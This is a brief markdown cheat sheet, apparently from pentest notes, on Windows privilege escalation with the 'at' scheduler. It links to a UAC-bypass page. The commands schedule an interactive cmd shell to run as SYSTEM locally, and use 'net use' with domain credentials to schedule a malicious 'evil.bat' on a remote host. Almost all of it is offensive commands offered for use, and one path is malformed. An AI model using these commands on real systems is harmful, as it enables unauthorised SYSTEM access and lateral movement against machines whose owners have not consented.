# Windows Privilege Escalation Commands

Command that can be executed from the context of a shell prompt that help escalate or increase attacker privilege of the target.

  * [UAC](uac.md) - How to bypass UAC.

# General Commands
### at (Scheduler)
 * **Command with arguments**: `at [TIME] [cmd]`
 * **Description**: This command can be used locally to escalate privilege to SYSTEM or be used across a network to execute commands on another system.
 * **Examples**: 
    * Locally - `at 13:20 /interactive cmd`
    * Remotely - From http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607
         * `net use \\[computername|IP] /user:DOMAIN\username password`
         * `net time \\[computername|IP]`
         * `at \\[computername|IP] 13:20 c:|temp\evil.bat`